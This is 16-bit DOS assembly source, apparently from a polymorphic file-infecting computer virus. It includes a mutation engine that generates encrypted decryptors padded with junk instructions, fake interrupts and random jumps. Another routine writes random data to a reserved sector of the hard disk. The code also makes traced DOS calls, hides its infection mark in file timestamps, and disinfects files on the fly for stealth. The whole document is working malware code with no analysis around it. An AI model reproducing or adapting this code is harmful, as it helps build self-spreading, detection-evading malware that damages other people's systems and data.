		DB      21h, 18h        ; Reserved.
		DB      21h, 19h        ; Get default drive.

                DB      '!*!,!0!M!Q!T!b!'       ; AND opcodes.
		DB       0Bh, 21h, 0Dh, 21h
Int_Table:
		INT     2Bh
		INT     2Ch
		INT     2Dh
		INT     28h
                INT     1Ch     ; This is bad programming!
                INT     08h     ; This 1 2!
		INT     0Ah
		INT     0Bh
		INT     0Ch
		INT     0Dh
		INT     0Fh
		INT     0Eh
		INT     70h
		INT     71h
		INT     72h
		INT     73h
		INT     74h
		INT     75h
                INT     76h   ; Can cause problems 4 example wit MegaStealth.
		INT     77h
		INT     01h
                INT     03h     ; 1 byte breakpoint.
                INT     03h
PushPop_Pairs:
		PUSH    AX
		POP     AX
		PUSH    BX
		POP     BX
		PUSH    CX
		POP     CX
		PUSH    DX
		POP     DX
		PUSH    DI
		POP     DI
		PUSH    SI
		POP     SI
		PUSH    BP
		POP     BP
		PUSH    DS
		POP     DS
		PUSH    ES
		POP     ES
		PUSH    SS
		POP     SS

Random          DW      0
DATA_74         DB      1Eh


SUB_17:
                CALL    Get_Random_Poly         ; Get random# in AX.

                TEST    AH, 00010000b           ; 1/8 chance.
		JZ      LOC_74

		CMP     BL, 02h
		JE      LOC_72

		CMP     BL, 04h
		JE      LOC_73

		JMP     LOC_74


LOC_72:
		ADD     AL, 64
		JNC     LOC_72

                AND     AL, 11111110b           ; 

		CMP     AL, DATA_74
		JE      SUB_17

		MOV     DATA_74, AL

		PUSH    SI

                CBW
		XCHG    BX, AX
		MOV     SI, OFFSET Int_Table
		MOV     AX, [BX+SI]

		POP     SI

		MOV     BL, 02h

		RETN

LOC_73:
		ADD     AL, 38
		JNC     LOC_73

		AND     AL, 11111110b

		CMP     AL, DATA_74
		JE      SUB_17

		MOV     DATA_74, AL
		PUSH    SI
		CBW
		XCHG    BX, AX
		MOV     SI, OFFSET DATA_70
		MOV     AH, [BX+SI]
		MOV     DH, [BX+SI+1]
		MOV     AL, 0B4h
		MOV     DL, 0CDh
		POP     SI
		MOV     BL, 04h

		RETN
LOC_74:
		MOV     BL, 00h

		RETN




SUB_18:
		MOV     BP, 03h
LOC_75:
		DEC     BP
		JZ      LOC_RET_78

		CALL    SUB_17
                ADD     CL, BL

                CMP     BL, 2
		JB      LOC_77
		JA      LOC_76

		STOSW
		JMP     LOC_75
LOC_76:
		STOSW

		MOV     AX, DX
		STOSW
LOC_77:
		JMP     LOC_75

LOC_RET_78:
		RETN

;
;
;
; Returns: BX = Random number 0 - 2.

Get_Ran_3:
		XOR     BX, BX
LOC_79:
		PUSH    AX
                CALL    Get_Random_Poly
		MOV     BL, AL
		POP     AX
		MOV     AL, BL

		OR      BL, BL
		JZ      LOC_79

                AND     BL, 00000011b           ; 0 - 3.

                CMP     BL, 3                   ; 0 - 2.
		JB      LOC_RET_80

		JMP     LOC_79

LOC_RET_80:
		RETN


Check_Poly_Sector:

		PUSH    CS
		PUSH    CS
		POP     ES
		POP     DS

		MOV     AH, 08h                 ; Get disk drive parameters
		MOV     DL, 80h                 ; of 1st harddisk.
		INT     13h

                MOV     BX, OFFSET Poly_Sector
		MOV     AX, 0201h
		INC     CH                      ; Last track of harddisk.
		DEC     DH                      ;
		DEC     DH
		MOV     CL, 01h                 ; 1st sector.
		MOV     DL, 80h
		INT     13h
		JC      Exit_Poly_Check

		CALL    Get_Random
		AND     AL, 00001111b           ; 0 - 15.

		CMP     AL, 7
		JE      Gen_Poly_Sector

		CMP     [BX], 0CCDDh            ; Polysector already present?
		JE      Exit_Poly_Check

Gen_Poly_Sector:
		MOV     CX, 256                 ; 256 words.
		MOV     DI, BX

Store_Random:
		CALL    Get_Random
		ADD     AX, [DI-2]              ; Add previous value.
		MOV     [DI], AX
		INC     DI
		INC     DI
                LOOP    Store_Random

		MOV     [BX], 0CCDDh            ; Polysector signature.
LOC_83:
		MOV     AH, 08h                 ; Get disk drive parameters.
		MOV     DL, 80h
		INT     13h

                MOV     BX, OFFSET Poly_Sector  ; Write polysector to disk.
		MOV     AX, 0301h
		INC     CH
		DEC     DH
		DEC     DH
		MOV     CL, 01h
		MOV     DL, 80h
		INT     13h
		JC      LOC_85

Exit_Poly_Check:

		RETN
LOC_85:
		MOV     AX, 440Dh
		MOV     BX, 180h
		MOV     CX, 84Bh
		INT     21h                     ; DOS Services  ah=function 44h
						;  IOctl-D block device control
						;   bl=drive, cx=category/type
						;   ds:dx ptr to parameter block
		JMP     LOC_83

;
; Gets a random number from the polymorphic sector.
; Returns: AX = Random number.
;
Get_Random_Poly:

		PUSH    BX

                MOV     BX, CS:Poly_Sector

                CMP     BX, 512
		JB      LOC_86

                AND     BX, 00000001b           ; 0 - 1.
                XOR     BL, 00000001b           ; Flip.
LOC_86:
                ADD     BX, 2                   ; Next word.
                MOV     CS:Poly_Sector, BX
                MOV     AX, CS:[Poly_Sector+BX]

		POP     BX

		RETN


;
; Return: AX = Random value (1 - 65535).
;
Get_Random:
		XOR     AL, AL
		OUT     43h, AL                 ; port 43H, 8253 timer control
						;  al = 0, latch timer0 count
		JMP     $+2               ; Delay for I/O.
		IN      AL, 40h
                MOV     AH, AL

		IN      AL, 40h
		XOR     AL, AH

		XCHG    AL, AH
		PUSH    CX
		MOV     CL, AH
		AND     CL, 00001111b
		ROL     AX, CL
		MOV     CX, AX
		AND     CX, 0000011111111111b

Delay_Loop:
		JMP     $+2
		NOP
		LOOP    Delay_Loop

		POP     CX
		XOR     CS:Random, AX
		ADD     AX, CS:Random

		OR      AH, AH
		JZ      Get_Random

		OR      AL, AL
		JZ      Get_Random

		RETN

Poly_Engine:
		PUSH    SI
                PUSH    BX                      ; Filehandle.

		CLD
                MOV     Poly_Sector, 0
                XOR     SI, SI
                MOV     DI, OFFSET Undoc
		MOV     DATA_77, 1C6Ah

                MOV     AX, Host_Entrypoint
		MOV     DATA_84, AX

                CALL    Get_Ran_3

                MOV     AL, [BX+Encr_Methods]
		MOV     AH, 0E0h
                MOV     word ptr Poke1, AX
		MOV     word ptr Shit3, AX
		XOR     BL, 03h

                MOV     AL, Encr_Methods[BX]
		MOV     Shit2, AL
                CALL    Get_Random_Poly
		MOV     DATA_94, AL
		MOV     Key_3, AL
		MOV     DATA_82, AH

		POP     BX
		PUSH    BX

		MOV     word ptr Decrypt_2, 0F72Eh
                MOV     BYTE PTR Key_2, 15h
		MOV     CX, 14h


LOCLOOP_89:
		LODSB                           ; String [si] to al
Shit3:

;*              SUB     AL,AH
		DB       28H,0E0H               ;  Fixup - byte match
		STOSB                           ; Store al to es:[di]
		LOOP    LOCLOOP_89              ; Loop if cx > 0

                MOV     CX, 1ECh

LOCLOOP_90:
		LODSB                           ; String [si] to al

		CMP     SI,1A3H
		JB      LOC_91

		XCHG    DATA_94, AH
                XOR     AL, AH
		ADD     AH, 01h
		XCHG    DATA_94, AH
LOC_91:
		NOT     AL
Poke1:
;*              SUB     AL,AH
		DB       28H,0E0H               ;  Fixup - byte match
		STOSB
		LOOP    LOCLOOP_90

		CALL    SUB_38
		JC      LOC_94

		MOV     CX,DATA_77
		JCXZ    LOC_93                  ; Jump if cx=0

		SUB     CX, 200h
		JC      LOC_92

		MOV     DATA_77, CX
		MOV     CX, 200h

		JMP     LOCLOOP_90
LOC_92:
                ADD     CX, 512
		MOV     DATA_77, 0

		MOV     DX, CX

		JMP     LOCLOOP_90
LOC_93:
		CALL    SUB_39
                CALL    SUB_31
		CALL    SUB_24

		MOV     DX, 1F6Ah
		MOV     AH, 40h
		ADD     CX, 11h
		NOP
		CALL    Traced_i21h
		CLC
LOC_94:
		POP     BX
		POP     SI

		RETN


SUB_24:
		PUSH    BX
		PUSH    BP

                MOV     SI, OFFSET Undoc
                MOV     DI, OFFSET Drew1

                XOR     CX, CX

                CALL    Make_Clear_Flags
		MOV     BL, 04h
		CALL    SUB_18
		CALL    SUB_34
		CALL    SUB_36
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		CALL    SUB_25
                CALL    Make_Uncon_JMP
		MOV     BL, 02h
		CALL    SUB_18
                CALL    Make_Uncon_JMP
                CALL    Get_Random_Poly

                CMP     AH, 128
		JB      LOC_95

                MOVSB
		JMP     LOC_96
LOC_95:
		OR      Flags, 00010000b
		SUB     CL, 01h
		INC     SI
LOC_96:
                CALL    Make_Uncon_JMP
		CALL    SUB_28
		MOV     CH,CL
                MOV     BL, 2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		MOVSW
		MOVSB
                CALL    Make_Uncon_JMP
		CALL    SUB_33
		MOV     BL,2
		CALL    SUB_18
		CALL    SUB_27
		MOV     BL,2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		CALL    SUB_26
		MOV     BL,2
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		MOV     AL,CL
		SUB     AL,CH
		MOV     CH,AL
		LODSW                           ; String [si] to ax
		SUB     AH, CH
		STOSW
		MOV     BL, 02h
		CALL    SUB_18
                CALL    Make_Uncon_JMP
		CALL    SUB_30
                CALL    Get_Random_Poly
		AND     AL, 00000111b
		ADD     CL, AL
		MOV     CH, 00h

		CMP     Host_Type, CH
		JE      LOC_97

		ADD     File_Mod512, CX
                CMP     File_Mod512, 512
		JB      LOC_97

                INC     Byte_Pages              ; Rounding.

                SUB     File_Mod512, 512
		JNZ     LOC_97

		DEC     Byte_Pages
LOC_97:
		POP     BP
		POP     BX

		RETN


SUB_25:
		PUSH    CX

		XOR     CX, CX
		MOV     AL, DATA_92
		MOV     CL, AL
                SHR     AL, 2                   ; DIV 4.
		MOV     DATA_92, AL

                AND     CL, 03h
		REP     MOVSB

		POP     CX

		RETN


SUB_26:
                CALL    Get_Random_Poly

		CMP     BYTE PTR DATA_97,4
		JAE     LOC_98

		XOR     AL, AH
		JP      LOC_98                  ; Jump if parity=1

		MOVSB

		RETN
LOC_98:
		MOV     BL, DATA_96
		MOV     BH, 00h

		CMP     BYTE PTR DATA_97, 06h
		JAE     LOC_100

		CMP     BYTE PTR DATA_97, 04h
		JAE     LOC_99

		TEST    AL, 00000001b
		JNZ     LOC_100
LOC_99:
		MOV     DL, 01h
                MOV     DH, Uncon_Jumps[BX]

		JMP     LOC_101
LOC_100:
		MOV     DL, 0FFh
		MOV     DH, [BX+DATA_109]
LOC_101:
		TEST    AL, 00000010b
		JNZ     LOC_102

                MOV     AL, 81h
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
                CBW
		STOSW
		INC     SI
		ADD     CL, 03h
		RETN
LOC_102:
                MOV     AL, 83h                 ; ADD
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
		STOSB

		INC     SI
		ADD     CL, 02h
		RETN

		DB      0C3H


SUB_27:
                CALL    Get_Random_Poly
		XOR     AL, AH
		JNS     LOC_103                 ; Jump if not sign
		MOVSB

		RETN
LOC_103:
		MOV     BL, DATA_94
		MOV     BH, 00h
                CMP     DATA_93, 80h
		NOP
		JA      LOC_105

		TEST    AL, 00000001b
		JNZ     LOC_104

		MOV     DL, 01h
		MOV     DH, Uncon_Jumps[BX]

		JMP     LOC_107
LOC_104:
		MOV     DL, 0FFh
		MOV     DH, DATA_109[BX]
		JMP     LOC_107
LOC_105:
		TEST    AL, 00000001b
		JNZ     LOC_106

		MOV     DL, 01h
		MOV     DH, DATA_109[BX]
		JMP     LOC_107
LOC_106:
		MOV     DL, 0FFh
		MOV     DH, Uncon_Jumps[BX]
LOC_107:
		TEST    AL, 00000010b
		JNZ     LOC_108

		MOV     AL, 81h
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
                CBW
		STOSW

		INC     SI
		ADD     CL, 03h
		RETN

LOC_108:
                MOV     AL, 83h                 ; ADD
		STOSB

		MOV     AL, DH
		STOSB

		MOV     AL, DL
		STOSB

		INC     SI
		ADD     CL, 02h

		RETN



SUB_28:
                CMP     DATA_93, 128
                NOP
		JA      LOC_RET_112

		PUSH    DX
		MOV     DX, OFFSET Buffer
		MOV     AL, DATA_93
		AND     AL, 07h
                CBW
		INC     AX
		ADD     DX,AX
		MOV     BL,DATA_97

		CMP     BL, 06h
		JE      LOC_109

		TEST    BL, 00000001b
		JNZ     LOC_109

		DEC     DX
LOC_109:
		MOV     AH, AL
		XOR     BX, BX
                MOV     BL, DATA_94
		MOV     AL, 81h
		STOSB

		TEST    AH, 00000001b
		JZ      LOC_110

                MOV     AL, Uncon_Jumps[BX]     ; Store JMP opcode.
		STOSB

		MOV     AX, DX
		NEG     AX
		STOSW
		JMP     LOC_111
LOC_110:
                MOV     AL, DATA_109[BX]
                STOSB

                MOV     AX, DX
                STOSW
LOC_111:
		ADD     CL,4
		POP     DX

LOC_RET_112:
		RETN



Make_Uncon_JMP:
                CALL    Get_Random_Poly

                TEST    AL, 00100000b           ; 1/8 chance.
		JZ      LOC_RET_116

                TEST    AL, 00001000b           ; 1/8 chance.
		JZ      LOC_113

                AND     AH, 03h                 ; 0 - 3.
                ADD     AH, 01h                 ; Prevent zero JMP.

                MOV     AL, 0EBh                ; JMP SHORT opcode.
                STOSW                           ; Store JMP SHORT.

		ADD     CL, 02h
		MOV     AL, AH

		JMP     LOC_114
LOC_113:
                AND     AH, 03h                 ; 0 - 3.
                ADD     AH, 01h                 ; 1 - 4.

                MOV     AL, 0E9h                ; Store JMP opcode.
		STOSB

                MOV     AL, AH                  ; Store dataword.
                CBW
		STOSW

                ADD     CL, 3
LOC_114:
                MOV     BL, AL
LOC_115:
                CALL    Get_Random_Poly
		MOV     AH, AL

                CMP     AH, 2Eh                 ; CS: override?
                JE      LOC_115                 ; Then get another value.

		AND     AH, 0F8h

                CMP     AH, 0B0h                ; MOV AL ?
                JE      LOC_115                 ; Then get another value.

		STOSB
		ADD     CL, 01h

                SUB     BL, 01h                 ; JMP-Hole filled with
                JNZ     LOC_115                 ; garbage?

LOC_RET_116:
		RETN



SUB_30:
		TEST    Flags, 00010000b
		JNZ     LOC_119

                CALL    Get_Random_Poly

		TEST    AL, 00000100b
		JNZ     LOC_118

		MOVSB

		RETN
LOC_118:
		AND     AH,7

		CMP     AH, 04h
		JE      SUB_30

		MOV     AL, AH
		OR      AL, 58h
		STOSB

		MOV     AL, 0FFh
		OR      AH, 0E0h
		STOSW

		ADD     CL, 02h

		RETN


LOC_119:
                XOR     Flags, 10h
                MOV     AL, 0E9h                ; JMP opcode.
                STOSB

                ADD     CL, 2
		MOV     AL, CL
                CBW
                ADD     AX, 1E7Bh
		NEG     AX
                STOSW

		RETN



SUB_31:
		PUSH    BX
		MOV     SI, 0E70h

                CALL    Get_Random_Poly
		JNP     LOC_120                 ; Jump if not parity

                MOV     DI, OFFSET Used_Mov_Ptr
		MOV     AX, [DI]
                PUSH    [DI+2]
		PUSH    SI

		MOVSW
		MOVSB

		POP     SI
		MOV     [SI], AX
		POP     AX
		MOV     [SI+2], AL
LOC_120:
		MOV     DI, OFFSET Undoc
                CALL    Get_Random_Poly

		CMP     AL, 55h
		JB      LOC_121

		CMP     AL, 0AAh
		JB      LOC_122

		MOV     AX, [SI+3]
		STOSW
		MOVSW
		MOVSB

		INC     SI
		INC     SI
                MOVSW
                MOVSB
                MOV     BYTE PTR DATA_92, 3Eh
		JMP     LOC_123
LOC_121:
                MOVSW
                MOVSB
		MOV     AX,[SI]
		INC     SI
		INC     SI
                MOVSW
                MOVSB
                STOSW
                MOV     BYTE PTR DATA_92, 2Fh
		JMP     LOC_123
LOC_122:
                MOVSW
                MOVSW
                MOVSW
                MOVSW
                MOV     BYTE PTR DATA_92, 3Bh
LOC_123:
		MOV     CX, 09h
		REP     MOVSB
		POP     BX
		RETN




Make_Clear_Flags:
                CALL    Get_Random_Poly         ; Get random number in AX.

                CMP     AL, 128                 ; 50% chance.
		JB      LOC_RET_127

		TEST    AH, 00001000b
                JNZ     LOC_125

                MOV     AL, 0FAh                ; CLI
Store1:
		STOSB
		ADD     CL, 01h

		RETN
LOC_125:
		PUSH    BX

                MOV     BX, OFFSET PushPop_Pairs
LOC_126:
                ADD     AL, 20                  ; Must be 20 or above.
                JNC     LOC_126                 ; Overflow?

                CBW
                AND     AL, 0FEh                ; Number must be even.
		ADD     BX, AX
                MOV     AH, [BX]                ; Get PUSH reg.

                POP     BX

                MOV     AL, 9Dh                 ; POPF

                CMP     Host_Type, 01h          ; Host is .EXE ?
                JE      Store1

		STOSW
		ADD     CL, 02h

LOC_RET_127:
		RETN

LOC_128:
                XOR     Flags, 8

		RETN

SUB_33:
		TEST    Flags, 00001000b
		JNZ     LOC_128

		PUSH    BX
LOC_129:
                CALL    Get_Random_Poly

		TEST    AH, 00000001b
		JZ      LOC_131

		AND     AX, 07h
		MOV     BX, AX

		CMP     BL, 04h
		JNE     LOC_130

		CMP     BYTE PTR DATA_81, 0B0h
		JE      LOC_129

		CMP     BYTE PTR DATA_96, 00h
		JE      LOC_129
LOC_130:
		MOV     AL, DATA_100[BX]
		STOSB

		INC     CL
		POP     BX

		RETN
LOC_131:
                CMP     BYTE PTR DATA_96, 0
                JE      LOC_129

                CMP     BYTE PTR DATA_95, 0
                JE      LOC_129
LOC_132:
                CALL    Get_Random_Poly
		AND     AX,7

		CMP     AL,5
                JA      LOC_132

                SHL     AL, 1                   ; MUL 2.
                MOV     BX, AX
                MOV     AX, DATA_101[BX]
                STOSW

		CMP     BL,6
                JA      LOC_133

                CALL    Get_Random_Poly
                AND     AL, 0Fh
                STOSB
                ADD     CL, 1

                CMP     BL, 6
                JNE     LOC_133

                MOV     AL, AH
                STOSB
                ADD     CL, 1
LOC_133:
                ADD     CL, 2
		POP     BX

		RETN


SUB_34:
                CALL    Get_Random_Poly

		CMP     AX, 5555h
		JB      LOC_RET_136

		OR      Flags, 00001000b

		CALL    Make_Dummy_Int
                CALL    Get_Random_Poly

		XCHG    BX, AX
		AND     BX, 02h
		MOV     AX, DATA_98[BX]
		STOSW

                MOV     DX, Host_Entrypoint
		ADD     DX, OFFSET Buffer
		ADD     DX, CX
		ADD     CL, 02h

		TEST    AL, 00001000b
		JNZ     LOC_134

                MOV     AL, 81h                 ; Arithmic
                STOSB

                ADD     CL, 7
		CALL    SUB_35

                MOV     AL, 0FAh
                STOSB

		XCHG    DX, AX
		STOSW

		RETN


LOC_134:
		MOV     AL, 80h
		STOSB
		ADD     CL,6
		CALL    SUB_35

                CMP     AH, 80h
                JA      LOC_135

                MOV     AL, 0FBh
                STOSB
                MOV     AL, DH
                STOSB

		RETN
LOC_135:
		MOV     AL, 0FAh
		STOSB

		XCHG    DX, AX
		STOSB

LOC_RET_136:
		RETN


SUB_35:
LOC_137:
                CALL    Get_Random_Poly
		MOV     BL, AL
		AND     BX, 07h

		CMP     BL, 04h
		JA      LOC_137

		MOV     AL, DATA_99[BX]
		STOSB

		CMP     BL, 03h
		JE      LOC_139

		CMP     BL, 04h
		JNE     LOC_RET_140

		TEST    BYTE PTR [DI-2], 00000001b
		JNZ     LOC_138

		NEG     DH
		NEG     DL

		RETN
LOC_138:
		NEG     DX
		RETN
LOC_139:
		NOT     DX

LOC_RET_140:
		RETN



SUB_36:
		TEST    Flags, 00001000b
		JZ      LOC_RET_141

                CALL    Get_Random_Poly
		AND     AH, 7Fh
		ADD     AH, 0Ah
		MOV     AL, 75h
		STOSW

LOC_RET_141:
		RETN


Make_Dummy_Int:
		ADD     CL, 02h
		MOV     BL, 2Ah
                CALL    Get_Random_Poly
LOC_142:
		ADD     AL, BL
		JNC     LOC_142

		AND     AX, 0000000011111110b
		XCHG    BX, AX
                MOV     AX, OFFSET Int_Table[BX]
		STOSW

		RETN



SUB_38:
		PUSH    AX
		CMP     DATA_77,0
		MOV     CX,200H
		JNZ     LOC_143
		MOV     CX,DX
LOC_143:
		MOV     DX, OFFSET Undoc
		MOV     DI, DX
		MOV     AH, 40h
		CALL    Traced_i21h
		POP     AX

		RETN


DATA_77         DW      0E6Ah
Host_Entrypoint DW      0
DATA_79         DB      0BFh
DATA_80         DW      9
DATA_81         DB      0B6h
DATA_82         DB      78h
Used_Mov_Ptr    DB      0BBh
DATA_84         DW      0
Used_Push_Ptr   DB      57h
Shit9           DB      2Eh
Shit2           DB      0
Shit1           DB      35h
Used_Ptr           DB      4Fh
Shit8           DB      4Bh
Shit6           DB      77h
                DB      0F9h, 0C3h


SUB_39:
		PUSH    BX

                CALL    Get_Ran_3
                MOV     AH, Mov_Ptr[BX]
                MOV     Used_Mov_Ptr, AH

                MOV     AH, Push_Ptr[BX]
                MOV     Used_Push_Ptr, AH

                CALL    Get_Random_Poly
		MOV     DATA_93, AH

                CMP     AH, 128                 ; 50% chance.
		JA      LOC_145

                MOV     AH, Dec_Ptr[BX]

		JMP     LOC_146
LOC_145:
                MOV     AH, Inc_Ptr[BX]
LOC_146:
                MOV     Used_Ptr, AH
                MOV     DL, BL
                ADD     BL, 3

                CMP     BL, 3
		JNE     LOC_147

                SUB     BL, 2
LOC_147:
		MOV     DATA_94,BL
LOC_148:
                CALL    Get_Random_Poly
		NOT     AX
		AND     AL, 07h
		MOV     BL, AL
		SHR     AL, 01h

		CMP     DATA_94, AL
		JE      LOC_148

		MOV     DATA_95, AL
		MOV     AH, DATA_110[BX]
		MOV     DATA_81, AH
		SHL     DL, 03h
		ADD     BL, DL
                MOV     AH, DATA_111[BX]
		MOV     Shit1, AH
LOC_149:
                CALL    Get_Random_Poly
		NOT     AX

		MOV     BL, AL
		AND     BL, 07h

                CMP     BL, 6
		JA      LOC_149

                CMP     DATA_94, BL
		JE      LOC_149

                CMP     DATA_95, BL
		JE      LOC_149

		MOV     DATA_96, BL
                MOV     AH, [BX+MOV_Reg]

		MOV     DATA_79, AH
                MOV     AH, OFFSET [BX+DEC_Reg]
                MOV     Shit8, AH

                CALL    Get_Random_Poly
                AND     AL, 00000111b           ; 0 - 7.
                CBW
                MOV     BX, AX
                MOV     AH, [Cond_Jumps+BX]
                MOV     Shit6, AH
                MOV     DATA_97, BL
                CALL    Get_Random_Poly
                NOT     AX
		XOR     BX, BX
		MOV     BL, AL
                AND     BL, 00000011b           ; 0 - 3.
                MOV     AL, Host_Type

                OR      AL, AL                  ; .COM-file?
		JZ      LOC_150

		MOV     BL, AL
LOC_150:
		MOV     AH, Overrides[BX]
                MOV     Shit9, AH
		MOV     AL, DATA_93
                AND     AL, 00000111b           ; 0 - 7.
                CBW
                INC     AX                      ; 1 - 8.
                ADD     AX, OFFSET Buffer
		MOV     DATA_80, AX
		POP     BX

		RETN

DATA_92         DB      0
DATA_93         DB      38H
DATA_94         DB      5DH
DATA_95         DB      3
DATA_96         DB      1
DATA_97         DB      4
DATA_98         DW      0EC8BH
		DB       54H, 5DH
DATA_99         DB      7EH, 76H, 6EH, 66H, 46h


;;
DATA_100        DB      64h, 65h, 67h, 9Bh, 0D6h, 9Bh, 64h, 65h

DATA_101        DW      0F0C0H
		DB      0C1H,0F0H,0F6H,0C8H,0F7H,0C8H
		DB      0D0H,0F0H,0D1H,0F0H

;               MOV      BX    DI    SI
Mov_Ptr         DB      0BBh, 0BFh, 0BEh

; --->          PUSH     BX    DI    SI
Push_Ptr        DB      053h, 057h, 056h

; --->          INC      BX    DI    SI
Inc_Ptr         DB      043h, 047h, 046h

; --->          DEC     BX   DI   SI
Dec_Ptr         DB      4Bh, 4Fh, 4Eh

; --->          MOV      AX,   BX,   CX,   DX,   DI,   SI,   BP.
MOV_Reg         DB      0B8h, 0BBh, 0B9h, 0BAh, 0BFh, 0BEh, 0BDh
DEC_Reg:
		DEC     AX
		DEC     BX
		DEC     CX
		DEC     DX
		DEC     DI
		DEC     SI
		DEC     BP


; --->                        JMP
Uncon_Jumps     DB      0E8h, 0EBh, 0E9h, 0EAh, 0EFh, 0EEh, 0EDh ; JMPs.
DATA_109        DB      0C0H, 0C3H,0C1H,0C2H,0C7H,0C6H,0C5H

; --->          MOV      AL    AH    BL    BH    CL    CH    DL    DH
DATA_110        DB      0B0h, 0B4h, 0B3h, 0B7h, 0B1h, 0B5h, 0B2h, 0B6h
DATA_111        DB      7
		DB       27H, 00H, 00H, 0FH, 2FH, 17H
		DB       37H, 05H, 25H, 1DH, 3DH, 0DH
		DB       2DH, 15H, 35H, 04H, 24H, 1CH
                DB       3CH, 0CH, 2CH, 14H, 34H

;                       JNZ  JNS  JG   JGE  JA   JNB  JB   JBE
Cond_Jumps      DB      75h, 79h, 7Fh, 7Dh, 77h, 73h, 72h, 76h

;                       DS:  CS:  ES:  SS:
Overrides       DB      3Eh, 2Eh, 26h, 36h      ; Segment overrides.
Encr_Methods    DB      30h, 00h, 28h, 30h      ; encr.

DATA_115        DB      0C0h, 0C4h, 0C3h, 0C7h, 0C1h, 0C5h, 0C2h, 0C6h

DATA_116        DB      0E8h, 0ECh, 0EBh, 0EFh, 0E9h, 0EDh, 0EAh, 0EEh
DATA_117        DB      75h, 78h, 7Ch, 7Eh
DATA_118        DW      1F16h, 1F50h, 0D88Eh, 0716h

                DB       50H, 07H, 8EH, 0C0h
DATA_119        DB      0C0h, 0C9H, 0D2H, 0DBh
Int24h          DW      4CBh, 512h
DATA_122        DW      6EEh
DATA_123        DW      70h



; Dummy critical-error handler.
NewInt24h:
		MOV     AL, 03h
Do_IRET:        IRET


Clean_File:
		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

		CALL    Set_Dummy_Handlers
		CALL    Save_FileAttr

		MOV     AX, 3D02h               ; Open file r/w.
		CALL    Traced_i21h
		JC      LOC_155

		PUSH    AX
		CALL    Check_FileName
		ADD     BX, 04h
		MOV     CX, BX
		POP     BX

                CMP     CX, 0Eh
		JE      LOC_154

		PUSH    CS
		POP     DS

		CLD
		MOV     DI, OFFSET FileName1
		MOV     SI, OFFSET FileName2
		REPE    CMPSB                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
		JCXZ    LOC_151                 ; Jump if cx=0

		JMP     LOC_154

LOC_151:
		MOV     CX, 28                  ; Read header.
		MOV     DX, OFFSET Buffer
		MOV     AH, 3Fh
		CALL    Traced_i21h
		JC      LOC_154

		CALL    Save_FileTime
		MOV     AX, Trace_Int
		AND     AL, 00011111b           ; Clear all but seconds.

		CMP     AL, 00010001b           ; Infected stamp?
		JNE     LOC_153

		MOV     AX, Marker

		CMP     AX, 'ZM'                ; True .EXE?
                JE      Do_Clean_EXE

		CMP     AX, 'MZ'
		JNE     LOC_153
Do_Clean_EXE:
		CALL    SUB_41
		JC      LOC_154
LOC_153:
		CALL    Restore_FileTime
LOC_154:
		MOV     AH, 3Eh                 ; Close file.
		CALL    Traced_i21h
LOC_155:
		CALL    Restore_FileAttr
		CALL    Restore_Dummy_Handlers

		POP     SI
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		RETN

SUB_41:
		MOV     AX, Init_CS             ; Size CS in bytes.
		MOV     DX, 16
		MUL     DX

		ADD     AX, Init_IP             ; Plus IP.
		ADC     DX, 0

		MOV     CX, Header_Size         ; Calculate headersize.
		SHL     CX, 04h                 ; MUL 16.

		ADD     AX, CX                  ; Plus headersize.
		ADC     DX, 0

		MOV     CX, DX                  ; Go to entrypoint of host.
		MOV     DX, AX
		MOV     AX, 4200h
		CALL    Traced_i21h
		JNC     No_Err_2

		RETN


No_Err_2:
		SUB     AX, Virus_Size
		SBB     DX, 0

		PUSH    AX
		PUSH    DX

		MOV     AH, 3Fh
		MOV     CX, 128
		MOV     DX, OFFSET Ruck
		CALL    Traced_i21h
		JNC     LOC_157

		CMP     AX, 36
		JA      LOC_157

		ADD     SP, 04h
		STC
		RETN

LOC_157:
		PUSH    BX

		MOV     DI, AX
		ADD     DI, DX
		MOV     CX, 50
		STD

		MOV     AL, '.'
		REPNE   SCASB

		OR      CX, CX
		JNZ     LOC_158

		POP     BX

		ADD     SP, 04h
		STC

		RETN
LOC_158:
		MOV     AH, [DI+2]
		XOR     BX, BX

LOC_159:
                CMP     Encr_Methods[BX], AH
		JE      LOC_161

		INC     BX

		CMP     BX, 04h
		JA      LOC_160

		JMP     LOC_159
LOC_160:
		POP     BX

		ADD     SP, 04h
		STC

		RETN

LOC_161:
		MOV     AL,[DI+3]
		XOR     BX, BX
LOC_162:
		CMP     AL, DATA_111[BX]
		JE      LOC_164

		INC     BX

		CMP     BX, 19h
		JA      LOC_163

		JMP     LOC_162
LOC_163:
		POP     BX
		ADD     SP, 04h
		STC

		RETN
LOC_164:
		AND     BL, 07h
		MOV     AL, DATA_110[BX]
		MOV     CX, 50
		REPNE   SCASB                   ; Rep zf=0+cx >0 Scan es:[di] for al

		OR      CX, CX
		JNZ     LOC_165

		POP     BX
		ADD     SP, 04h
		STC
		RETN
LOC_165:
		MOV     AL, [DI+2]
		CLD
		POP     BX
		POP     CX
		POP     DX
		PUSH    DX

		PUSH    CX
		PUSH    AX

		MOV     AX, 4200h
		ADD     DX, OFFSET Old_Entry
		ADC     CX, 0
		CALL    Traced_i21h

		MOV     CX, 15
		MOV     DX, OFFSET Ruck
		MOV     AH, 3Fh                 ; Read 
		CALL    Traced_i21h

		POP     AX
                MOV     byte ptr Crp_1, AH
		JMP     $+2               ; delay for I/O
		MOV     DI, DX
		MOV     CX, 15

LOCLOOP_166:
Crp_1:
		ADD     [DI],AL
		NOT     BYTE PTR [DI]

		INC     DI
		LOOP    LOCLOOP_166

		MOV     DI,DX

		MOV     AX,[DI]
		MOV     Init_IP, AX

		MOV     AX, [DI+2]
		MOV     Init_CS, AX

		MOV     AX, [DI+4]
		MOV     Init_SP, AX

		MOV     AX, [DI+6]
		MOV     Init_SS, AX

		MOV     AX, [DI+8]
		MOV     File_Mod512, AX

		MOV     AX, [DI+0AH]
		MOV     Byte_Pages, AX

